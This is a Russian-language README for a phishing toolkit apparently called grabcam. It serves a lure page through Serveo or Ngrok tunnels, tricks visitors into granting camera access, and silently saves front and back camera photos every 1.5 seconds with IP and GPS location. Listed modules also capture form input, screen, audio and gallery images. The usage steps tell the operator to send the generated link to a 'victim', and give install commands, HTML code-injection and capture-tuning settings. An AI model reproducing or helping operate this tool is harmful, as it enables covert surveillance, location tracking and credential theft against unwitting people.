## 📋 Описание

**Camera Phishing Tool** — это продвинутый скрипт для тестирования безопасности веб-камер через браузер. Инструмент использует социальную инженерию для получения доступа к камере устройства и автоматически сохраняет фотографии с временными метками.

## ✨ Особенности

### 🎯 Основной функционал
- 📱 **Поддержка обеих камер** — автоматический захват с фронтальной и задней камеры
- 🌐 **Порт-форвардинг** — поддержка Serveo (по умолчанию) и Ngrok
- 📍 **Геолокация** — автоматическое определение местоположения по IP
- 📊 **Статистика** — отслеживание количества фотографий и подключений в реальном времени
- 📁 **Организация данных** — автоматическая структуризация сохраненных файлов по IP/устройствам
- 🎨 **HTML шаблоны** — поддержка кастомных HTML файлов с автоматической инжекцией кода

### 🔧 Технические возможности
- 🔄 **Автоматическая инжекция кода** — скрипт автоматически добавляет необходимый JavaScript в любой HTML файл
- 📝 **Подробное логирование** — все события записываются в лог-файлы с временными метками
- 🎯 **Точная геолокация** — GPS координаты и информация о местоположении
- 📸 **Доступ к галерее** — возможность получения изображений из галереи устройства
- 🛡️ **Обработка ошибок** — надежная обработка всех возможных ошибок

## 🚀 Установка

### Требования
- Linux (рекомендуется Kali Linux) или Termux
- PHP 7.0+
- SSH клиент
- Bash 4.0+

### Быстрая установка

```bash
# Клонировать репозиторий
git clone https://github.com/yourusername/camera-phishing-tool.git
cd camera-phishing-tool

# Сделать скрипт исполняемым
chmod +x grabcam.sh

./grabcam.sh
```

## 📖 Использование

### Базовое использование

1. **Запустите скрипт:**
   ```bash
   ./grabcam.sh
   ```

2. **Выберите метод порт-форвардинга:**
   - `1` - Serveo (по умолчанию, рекомендуется для России)
   - `2` - Ngrok (требует регистрации)

3. **Введите поддомен (для Serveo):**
   - Оставьте пустым для случайного поддомена
   - Или введите свой поддомен

4. **Скопируйте ссылку** и отправьте жертве

5. **Ожидайте подключений** — скрипт автоматически:
   - Отслеживает подключения
   - Сохраняет фотографии
   - Показывает статистику

### Использование кастомного HTML

1. **Поместите ваш HTML файл** в директорию проекта

2. **Укажите имя файла:**
   ```bash
   export HTML_TEMPLATE="my-template.html"
   ./grabcam.sh
   ```

   Или просто переименуйте файл в `grabcam.html`

3. **Скрипт автоматически** добавит необходимый код для работы камеры

### Структура сохраненных файлов

```
Photo/
├── [IP_ADDRESS]/
│   ├── front/
│   │   ├── cam_front_YYYYMMDDHHmmss_timestamp.png
│   │   └── ...
│   ├── back/
│   │   ├── cam_back_YYYYMMDDHHmmss_timestamp.png
│   │   └── ...
│   ├── geo_info.txt          # Информация о геолокации
│   └── gps_location.txt       # GPS координаты
```

## 🚀 Запуск только Grabcam (без OSINT Panel)

Чтобы запустить **только Grabcam** (удобно для передачи одного инструмента другому пользователю):

```bash
cd tools/grabcam
python3 run_standalone.py
```

Откройте в браузере: **http://127.0.0.1:5050**

Остановка: `Ctrl+C` в терминале.

Папку `tools/grabcam` можно целиком скопировать и передать; для автономного запуска нужна структура проекта с папкой `backend` на уровень выше (см. `standalone/README.md`), либо развернуть из корня репозитория.

```

├── run_standalone.py       # Запуск Grabcam без OSINT Panel (порт 5050)
├── standalone/             # Автономное веб-приложение
│   ├── app.py              # Flask: API и раздача панели
│   ├── index.html

├── panel/                  # Панель (CSS и JS модули)
│   ├── js/
│   │   ├── tool-grabcam.js       # Точка входа (сборка модулей)
│   │   ├── grabcam-layout.config.js
│   │   └── modules/
│   │       ├── config.js         # API, лимиты, интервалы
│   │       ├── utils.js          # escapeHtml, copy, render, loadLeaflet
│   │       ├── state.js          # Общее состояние панели
│   │       ├── layout.js        # Сетка и buildPanelHTML
│   │       ├── features/        # Один файл = одна карточка/функция
│   │       │   ├── index.js
│   │       │   ├── session.js   # Сводка сессии (длительность, цели, IP)
│   │       │   ├── control.js   # Запуск/остановка, ссылка, опции
│   │       │   ├── link.js      # Копирование, экспорт
│   │       │   ├── map.js       # Карта (показать точку, очистить)
│   │       │   ├── photos.js    # Загрузка фото
│   │       │   ├── locations.js # Список местоположений
│   │       │   ├── forms.js     # Захваты форм
│   │       │   ├── screen.js    # Захват экрана
│   │       │   ├── audio.js     # Аудио
│   │       │   └── summary.js   # Текстовая сводка
│   │       └── widgets/         # HTML разметка карточек
│   │           ├── index.js
│   │           ├── control.js, summary.js, link.js, map.js, ...
│   └── css/
│       ├── tool-grabcam.css     # Точка входа (@import остальных)
│       ├── base.css             # Переменные, сетка, общие карточки
│       ├── shared.css           # Кнопки, переключатели, списки

│       │   ├── screen.css, audio.css, summary-text.css

├── options.json            # Опции (камера, гео, форма и т.д.)
├── form_captures.json
```

**Python backend** инструмента (запуск PHP, туннели, API) находится в корне проекта: `backend/tools/tool_grabcam.py` — он подхватывается OSINT Panel и использует папку `tools/grabcam/` как рабочую директорию.

### Идеи по порядку в директории

При желании можно дополнительно разнести файлы так:

- **`server/`** — все PHP-скрипты (`index.php`, `log.php`, `post.php`, `location.php`, `audio.php`, `ip.php`, `template.php`). Тогда в backend и в `grabcam.sh` нужно указать корень документа PHP как `tools/grabcam/server` и поправить пути к `Photo/`, `options.json` в PHP (например `__DIR__ . '/../Photo'`).
- **`page/`** — страница-ловушка `grabcam.html`, чтобы явно отделить её от панели и серверных скриптов.
- **`data/`** — рабочие файлы (`options.json`, `form_captures.json`, `Photo/`, `ip.txt` и т.п.), чтобы не смешивать их с кодом. Потребуется обновить пути в backend и в PHP.

Сейчас PHP и данные лежат в корне `tools/grabcam/`, чтобы не менять backend и скрипты; при необходимости перенос можно сделать по шагам с обновлением путей.

## 🎨 Настройки

### Изменение интервала захвата

В сгенерированном HTML файле найдите:

```javascript
var CAPTURE_INTERVAL = 1500; // миллисекунды (по умолчанию 1.5 сек)
```

Измените значение на желаемое (в миллисекундах).

### Изменение качества изображения

```javascript
var IMAGE_QUALITY = 1.0; // от 0.0 до 1.0 (по умолчанию максимальное)
```

### Настройка порта

По умолчанию используется порт `3333`. Для изменения отредактируйте скрипт:

```bash
php -S 127.0.0.1:3333
```

## 🔧 Решение проблем

### Проблема: Serveo не работает

**Решение:** Попробуйте Ngrok:
```bash
# Выберите опцию 2 при запуске скрипта
```

### Проблема: Камера не запрашивается

**Решение:** 
1. Убедитесь, что HTML файл содержит placeholder `forwarding_link`
2. Проверьте консоль браузера (F12) на наличие ошибок
3. Убедитесь, что используется HTTPS (Serveo/Ngrok предоставляют HTTPS)

### Проблема: Фотографии не сохраняются

**Решение:**
1. Проверьте права доступа к директории `Photo/`
2. Убедитесь, что PHP сервер запущен
3. Проверьте файл `post.php` на наличие ошибок
